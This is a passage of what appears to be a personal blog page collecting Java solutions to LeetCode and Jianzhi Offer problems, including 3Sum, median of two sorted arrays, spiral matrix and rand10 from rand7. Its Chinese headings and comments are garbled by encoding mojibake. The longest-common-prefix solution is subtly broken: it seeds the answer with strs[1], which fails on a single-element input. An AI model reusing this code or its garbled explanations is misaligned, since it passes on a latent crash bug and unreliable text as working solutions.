class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-56-II-æ•°ç»„ä¸­æ•°å­—å‡ºç°çš„æ¬¡æ•°-II"><a href="#å‰‘æŒ‡-Offer-56-II-æ•°ç»„ä¸­æ•°å­—å‡ºç°çš„æ¬¡æ•°-II" class="headerlink" title="å‰‘æŒ‡ Offer 56 - II. æ•°ç»„ä¸­æ•°å­—å‡ºç°çš„æ¬¡æ•° II"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-ii-lcof/">å‰‘æŒ‡ Offer 56 - II. æ•°ç»„ä¸­æ•°å­—å‡ºç°çš„æ¬¡æ•° II</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è®¡ç®—æ¯ä¸ªä½1å‡ºç°çš„æ¬¡æ•°ï¼Œ ç„¶åå¯¹3å–ä½™;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">singleNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] temp = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">32</span>];</span><br><span class="line">        <span class="type">int</span> mask;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            mask = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((num &amp; mask) != <span class="number">0</span>) &#123;</span><br><span class="line">                    temp[i] ++;</span><br><span class="line">                &#125;</span><br><span class="line">                mask = mask &lt;&lt; <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        mask = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (temp[i] % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                res = res ^ mask;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            mask &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">singleNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            map.put(num, map.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.get(num) == <span class="number">1</span>) &#123;</span><br><span class="line">                res = num;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-39-æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°è¶…è¿‡ä¸€åŠçš„æ•°å­—"><a href="#å‰‘æŒ‡-Offer-39-æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°è¶…è¿‡ä¸€åŠçš„æ•°å­—" class="headerlink" title="å‰‘æŒ‡ Offer 39. æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°è¶…è¿‡ä¸€åŠçš„æ•°å­—"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-chu-xian-ci-shu-chao-guo-yi-ban-de-shu-zi-lcof/">å‰‘æŒ‡ Offer 39. æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°è¶…è¿‡ä¸€åŠçš„æ•°å­—</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">æ‘©å°”æŠ•ç¥¨æ³•</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ç»™å®šçš„æ•°ç»„æ€»æ˜¯å­˜åœ¨å¤šæ•°å…ƒç´  ï¼Œå› æ­¤æœ¬é¢˜ä¸ç”¨è€ƒè™‘æ•°ç»„ä¸å­˜åœ¨ä¼—æ•° çš„æƒ…å†µã€‚è‹¥è€ƒè™‘ï¼Œéœ€è¦åŠ å…¥ä¸€ä¸ª â€œéªŒè¯ç¯èŠ‚â€ ï¼Œéå†æ•°ç»„ nums ç»Ÿè®¡ x çš„æ•°é‡ã€‚</span></span><br><span class="line"><span class="comment">è‹¥ x çš„æ•°é‡è¶…è¿‡æ•°ç»„é•¿åº¦ä¸€åŠï¼Œåˆ™è¿”å› x ï¼›</span></span><br><span class="line"><span class="comment">å¦åˆ™ï¼Œè¿”å›æœªæ‰¾åˆ°ä¼—æ•°ï¼›</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">majorityElement</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>, votes = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (votes == <span class="number">0</span>) &#123;</span><br><span class="line">                x = num;</span><br><span class="line">            &#125;</span><br><span class="line">            votes += x == num ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="470-ç”¨-Rand7-å®ç°-Rand10"><a href="#470-ç”¨-Rand7-å®ç°-Rand10" class="headerlink" title="470. ç”¨ Rand7() å®ç° Rand10()"></a><a href="https://leetcode-cn.com/problems/implement-rand10-using-rand7/">470. ç”¨ Rand7() å®ç° Rand10()</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> <span class="keyword">extends</span> <span class="title class_">SolBase</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rand10</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> rand7();</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> rand7();</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> (a-<span class="number">1</span>)*<span class="number">7</span> + b; <span class="comment">// rand 49</span></span><br><span class="line">            <span class="keyword">if</span>(num &lt;= <span class="number">40</span>) <span class="keyword">return</span> num % <span class="number">10</span> + <span class="number">1</span>; <span class="comment">// æ‹’ç»é‡‡æ ·</span></span><br><span class="line">            </span><br><span class="line">            a = num - <span class="number">40</span>; <span class="comment">// rand 9</span></span><br><span class="line">            b = rand7();</span><br><span class="line">            num = (a-<span class="number">1</span>)*<span class="number">7</span> + b; <span class="comment">// rand 63</span></span><br><span class="line">            <span class="keyword">if</span>(num &lt;= <span class="number">60</span>) <span class="keyword">return</span> num % <span class="number">10</span> + <span class="number">1</span>;</span><br><span class="line">            </span><br><span class="line">            a = num - <span class="number">60</span>; <span class="comment">// rand 3</span></span><br><span class="line">            b = rand7();</span><br><span class="line">            num = (a-<span class="number">1</span>)*<span class="number">7</span> + b; <span class="comment">// rand 21</span></span><br><span class="line">            <span class="keyword">if</span>(num &lt;= <span class="number">20</span>) <span class="keyword">return</span> num % <span class="number">10</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="æ•°ç»„å’Œå­—ç¬¦ä¸²"><a href="#æ•°ç»„å’Œå­—ç¬¦ä¸²" class="headerlink" title="æ•°ç»„å’Œå­—ç¬¦ä¸²"></a>æ•°ç»„å’Œå­—ç¬¦ä¸²</h2><h3 id="15-ä¸‰æ•°ä¹‹å’Œ-x2F-x2F"><a href="#15-ä¸‰æ•°ä¹‹å’Œ-x2F-x2F" class="headerlink" title="15. ä¸‰æ•°ä¹‹å’Œ&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/3sum/">15. ä¸‰æ•°ä¹‹å’Œ</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ’åº+åŒæŒ‡é’ˆ</span></span><br><span class="line"><span class="comment">// æ³¨æ„ç›¸åŒå…ƒç´ çš„å¤„ç†,å…ˆå…ƒç´ ç›´æ¥è·³è¿‡å°±ä¸ä¼šæœ‰é‡å¤,ä¸éœ€è¦é€šè¿‡res.contains(tmp)æ¥åˆ¤æ–­(ä¼šè¶…æ—¶).</span></span><br><span class="line"><span class="comment">// -4 -1 -1 0 1 2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (nums == <span class="literal">null</span> || nums.length &lt; <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length - <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[l] + nums[r];</span><br><span class="line">                <span class="keyword">if</span> (sum == <span class="number">0</span>) &#123;</span><br><span class="line">                    ArrayList&lt;Integer&gt; tmp = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                    tmp.add(nums[i]);</span><br><span class="line">                    tmp.add(nums[l]);</span><br><span class="line">                    tmp.add(nums[r]);</span><br><span class="line">                    res.add(tmp);</span><br><span class="line">                    <span class="keyword">while</span> (l &lt; r &amp;&amp; nums[l] == nums[l + <span class="number">1</span>]) &#123;</span><br><span class="line">                        ++l;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">while</span> (l &lt; r &amp;&amp; nums[r] == nums[r - <span class="number">1</span>]) &#123;</span><br><span class="line">                        --r;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ++l;</span><br><span class="line">                    --r;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    ++l;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    --r;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-å¯»æ‰¾ä¸¤ä¸ªæ­£åºæ•°ç»„çš„ä¸­ä½æ•°"><a href="#4-å¯»æ‰¾ä¸¤ä¸ªæ­£åºæ•°ç»„çš„ä¸­ä½æ•°" class="headerlink" title="4. å¯»æ‰¾ä¸¤ä¸ªæ­£åºæ•°ç»„çš„ä¸­ä½æ•°"></a><a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays/">4. å¯»æ‰¾ä¸¤ä¸ªæ­£åºæ•°ç»„çš„ä¸­ä½æ•°</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å…³é”®ç‚¹:æ‰¾ç¬¬kå°çš„æ•°</span></span><br><span class="line"><span class="comment">k = 7</span></span><br><span class="line"><span class="comment">A: 1 3 4 9</span></span><br><span class="line"><span class="comment">B: 1 2 3  4 5  6 7 8 9</span></span><br><span class="line"><span class="comment">k = 4</span></span><br><span class="line"><span class="comment">A: 1 3 4 9</span></span><br><span class="line"><span class="comment">B: 4 5  6 7 8 9</span></span><br><span class="line"><span class="comment">k = 2</span></span><br><span class="line"><span class="comment">A: 4 9</span></span><br><span class="line"><span class="comment">B: 4 5  6 7 8 9</span></span><br><span class="line"><span class="comment">k = 1</span></span><br><span class="line"><span class="comment">A: 9</span></span><br><span class="line"><span class="comment">B: 4 5  6 7 8 9</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">findMedianSortedArrays</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums2.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">total</span> <span class="operator">=</span> m + n;</span><br><span class="line">        <span class="keyword">if</span> (total % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m1</span> <span class="operator">=</span> total / <span class="number">2</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m2</span> <span class="operator">=</span> total / <span class="number">2</span> - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> (getKth(nums1, nums2, m1 + <span class="number">1</span>) + getKth(nums1, nums2, m2 + <span class="number">1</span>)) / <span class="number">2.0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m3</span>  <span class="operator">=</span>total / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">return</span> getKth(nums1, nums2, m3 + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="title function_">getKth</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums2.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (index1 == nums1.length) &#123;</span><br><span class="line">                <span class="keyword">return</span> nums2[index2 + k - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (index2 == nums2.length) &#123;</span><br><span class="line">                <span class="keyword">return</span> nums1[index1 + k - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (k == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> Math.min(nums1[index1], nums2[index2]);</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">// ä¸ºä»€ä¹ˆä¸ç›´æ¥äºŒåˆ†,å› ä¸ºå¦‚æœå…¶ä¸­ä¸€ä¸ªæ•°ç»„ç‰¹åˆ«å¤§çš„æ—¶å€™ä¼šæ¶ˆè€—ä¸€äº›æ—¶é—´</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> k / <span class="number">2</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">newIndex1</span> <span class="operator">=</span> Math.min(index1 + half, m) - <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">newIndex2</span> <span class="operator">=</span> Math.min(index2 + half, n)  - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums1[newIndex1] &gt; nums2[newIndex2]) &#123;</span><br><span class="line">                k -= newIndex2 - index2 + <span class="number">1</span>;</span><br><span class="line">                index2 = newIndex2 + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                k -= newIndex1 - index1 + <span class="number">1</span>;</span><br><span class="line">                index1 = newIndex1 + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="11-ç››æœ€å¤šæ°´çš„å®¹å™¨"><a href="#11-ç››æœ€å¤šæ°´çš„å®¹å™¨" class="headerlink" title="11. ç››æœ€å¤šæ°´çš„å®¹å™¨"></a><a href="https://leetcode-cn.com/problems/container-with-most-water/">11. ç››æœ€å¤šæ°´çš„å®¹å™¨</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ä¸€å¼€å§‹ä¸¤ä¸ªæŒ‡é’ˆä¸€ä¸ªæŒ‡å‘å¼€å¤´ä¸€ä¸ªæŒ‡å‘ç»“å°¾ï¼Œæ­¤æ—¶å®¹å™¨çš„åº•æ˜¯æœ€å¤§çš„ï¼Œæ¥ä¸‹æ¥éšç€æŒ‡é’ˆå‘å†…ç§»åŠ¨ï¼Œä¼šé€ æˆå®¹å™¨çš„åº•å˜å°ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æƒ³è¦è®©å®¹å™¨ç››æ°´å˜å¤šï¼Œå°±åªæœ‰åœ¨å®¹å™¨çš„é«˜ä¸Šä¸‹åŠŸå¤«ã€‚ é‚£æˆ‘ä»¬è¯¥å¦‚ä½•å†³ç­–å“ªä¸ªæŒ‡é’ˆç§»åŠ¨å‘¢ï¼Ÿæˆ‘ä»¬èƒ½å¤Ÿå‘ç°ä¸ç®¡æ˜¯å·¦æŒ‡é’ˆå‘å³ç§»åŠ¨ä¸€ä½ï¼Œè¿˜æ˜¯å³æŒ‡é’ˆå‘å·¦ç§»åŠ¨ä¸€ä½ï¼Œå®¹å™¨çš„åº•éƒ½æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ¯”åŸæ¥å‡å°‘äº† 1ã€‚è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬æƒ³è¦è®©æŒ‡é’ˆç§»åŠ¨åçš„å®¹å™¨é¢ç§¯å¢å¤§ï¼Œå°±è¦ä½¿ç§»åŠ¨åçš„å®¹å™¨çš„é«˜å°½é‡å¤§ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©æŒ‡é’ˆæ‰€æŒ‡çš„é«˜è¾ƒå°çš„é‚£ä¸ªæŒ‡é’ˆè¿›è¡Œç§»åŠ¨ï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¿ç•™äº†å®¹å™¨è¾ƒé«˜çš„é‚£æ¡è¾¹ï¼Œæ”¾å¼ƒäº†è¾ƒå°çš„é‚£æ¡è¾¹ï¼Œä»¥è·å¾—æœ‰æ›´é«˜çš„è¾¹çš„æœºä¼šã€‚</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxArea</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> height.length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = len - <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">      ans = Math.max(ans, Math.min(height[left], height[right]) * (right - left) );</span><br><span class="line">      <span class="keyword">if</span> (height[left] &gt;= height[right]) &#123;</span><br><span class="line">        right--;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        left++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="88-åˆå¹¶ä¸¤ä¸ªæœ‰åºæ•°ç»„-x2F-x2F"><a href="#88-åˆå¹¶ä¸¤ä¸ªæœ‰åºæ•°ç»„-x2F-x2F" class="headerlink" title="88. åˆå¹¶ä¸¤ä¸ªæœ‰åºæ•°ç»„&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/merge-sorted-array/">88. åˆå¹¶ä¸¤ä¸ªæœ‰åºæ•°ç»„</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åŒæŒ‡é’ˆ, ä»åå¾€å‰</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span> m, <span class="type">int</span>[] nums2, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> m -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> n - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> m + n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &gt;= <span class="number">0</span> &amp;&amp; j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums1[i] &gt; nums2[j]) &#123;</span><br><span class="line">                nums1[index--] = nums1[i--];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                nums1[index--] = nums2[j--];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            nums1[index--] = nums2[j --];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="14-æœ€é•¿å…¬å…±å‰ç¼€-x2F"><a href="#14-æœ€é•¿å…¬å…±å‰ç¼€-x2F" class="headerlink" title="14. æœ€é•¿å…¬å…±å‰ç¼€&#x2F;"></a><a href="https://leetcode-cn.com/problems/longest-common-prefix/">14. æœ€é•¿å…¬å…±å‰ç¼€</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">longestCommonPrefix</span><span class="params">(String[] strs)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ans</span> <span class="operator">=</span> strs[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; strs.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ( j &lt; ans.length() &amp;&amp; j &lt; strs[i].length() &amp;&amp; ans.charAt(j) == strs[i].charAt(j)) &#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = strs[i].substring(<span class="number">0</span>, j);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="54-èºæ—‹çŸ©é˜µ"><a href="#54-èºæ—‹çŸ©é˜µ" class="headerlink" title="54. èºæ—‹çŸ©é˜µ"></a><a href="https://leetcode-cn.com/problems/spiral-matrix/">54. èºæ—‹çŸ©é˜µ</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä¸€åœˆä¸€åœˆéå†,å¤–åœˆéå†ç»“æŸå†…åœˆåˆæ˜¯ä¸€ä¸ªæ–°çš„çŸ©é˜µ</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">spiralOrder</span><span class="params">(<span class="type">int</span>[][] matrix)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> matrix.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> m * n;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> n - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">top</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">bottom</span> <span class="operator">=</span> m - <span class="number">1</span>;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (sum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left; i &lt;= right &amp;&amp; sum &gt; <span class="number">0</span>; i++) &#123;</span><br><span class="line">                res.add(matrix[top][i]);</span><br><span class="line">                sum--;</span><br><span class="line">            &#125;</span><br><span class="line">            top++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> top; i &lt;= bottom &amp;&amp; sum &gt; <span class="number">0</span>; i++) &#123;</span><br><span class="line">                res.add(matrix[i][right]);</span><br><span class="line">                sum--;</span><br><span class="line">            &#125;</span><br><span class="line">            right--;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> right; i &gt;= left &amp;&amp; sum &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">                res.add(matrix[bottom][i]);</span><br><span class="line">                sum--;</span><br><span class="line">            &#125;</span><br><span class="line">            bottom--;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> bottom; i &gt;= top &amp;&amp; sum &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">                res.add(matrix[i][left]);</span><br><span class="line">                sum--;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

